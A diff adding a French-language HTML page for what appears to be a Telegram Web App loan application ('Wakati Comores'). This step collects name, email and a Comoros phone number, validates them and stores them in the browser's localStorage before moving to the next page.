@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wakati Comores - Demande de Prêt</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --wakati-navy: #071932;       /* Deep Navy Blue from Wakati Logo */
+            --wakati-navy-light: #0f2c52;
+            --wakati-red: #b51924;        /* Deep Crimson Red Accent from Logo */
+            --wakati-red-dark: #8e121b;
+            --bg-color: #f4f6f9;          /* Soft Cool Gray Background */
+            --card-bg: #ffffff;
+            --text-main: #071932;
+            --text-muted: #5a677d;
+            --input-border: #dce3ec;
+            --input-focus: #b51924;
+            --btn-gray: #eef2f6;
+            --btn-gray-text: #071932;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation Bar - Wakati Deep Navy & Red */
+        .app-header {
+            width: 100%;
+            background: linear-gradient(90deg, var(--wakati-navy) 0%, #0b2447 82%, var(--wakati-red) 100%);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(7, 25, 50, 0.2);
+        }
+
+        .back-btn-top {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+        }
+
+        .header-title .region {
+            color: #ffffff;
+            font-size: 12px;
+            margin-left: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--wakati-red);
+            padding: 2px 7px;
+            border-radius: 4px;
+            letter-spacing: 0.4px;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: #ffffff;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 20px;
+            box-shadow: 0 6px 25px rgba(7, 25, 50, 0.06);
+            border: 1px solid #e6ebf2;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 25px;
+            color: var(--wakati-navy);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 24px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 32px;
+            width: 100%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 6px;
+            background-color: #dce3ec;
+            border-radius: 3px;
+        }
+
+        .step-bar.active {
+            background: linear-gradient(90deg, var(--wakati-navy) 0%, var(--wakati-red) 100%);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--wakati-navy);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 2px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: var(--wakati-navy);
+            outline: none;
+            width: 100%;
+            transition: border-color 0.2s;
+        }
+
+        .form-control::placeholder {
+            color: #9aa6b8;
+        }
+
+        .form-control:focus {
+            border-color: var(--wakati-red);
+        }
+
+        /* Phone Input Group */
+        .phone-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #f0f4fa;
+            border: 2px solid #dce3ec;
+            border-radius: 10px;
+            padding: 0 14px;
+            font-weight: 700;
+            font-size: 15px;
+            color: var(--wakati-navy);
+            white-space: nowrap;
+        }
+
+        .flag-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        /* Buttons Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #e1e7ee;
+        }
+
+        .btn-next {
+            background: linear-gradient(135deg, var(--wakati-navy) 0%, var(--wakati-navy-light) 65%, var(--wakati-red) 100%);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: opacity 0.2s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(7, 25, 50, 0.25);
+        }
+
+        .btn-next:active {
+            opacity: 0.92;
+            transform: scale(0.99);
+        }
+
+        /* Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Wakati Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span>WAKATI</span><span class="region">Comores</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 2 sur 3</div>
+
+    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Personal Info Form -->
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">Prénom</label>
+            <input type="text" id="firstName" class="form-control" placeholder="Ali" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">Nom</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Said" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Adresse Email</label>
+            <input type="email" id="email" class="form-control" placeholder="ali.said@exemple.km" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Numéro de Téléphone Wakati</label>
+            <div class="phone-group">
+                <div class="country-prefix">
+                    <span class="flag-icon">🇰🇲</span>
+                    <span>+269</span>
+                </div>
+                <input type="tel" id="phone" class="form-control" placeholder="3312345" maxlength="7" pattern="[0-9]{7}" required>
+            </div>
+            <div class="phone-hint">7 chiffres (ex: 3312345)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">SUIVANT</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Wakati Comores • Nduwo Uwo
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing saved user info
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("Veuillez remplir tous les champs.");
+            return;
+        }
+
+        if (!/^\d{7}$/.test(phone)) {
+            alert("Veuillez entrer un numéro Wakati valide à 7 chiffres.");
+            return;
+        }
+
+        // Save stored details
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        
+        // Save phone specifically for API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
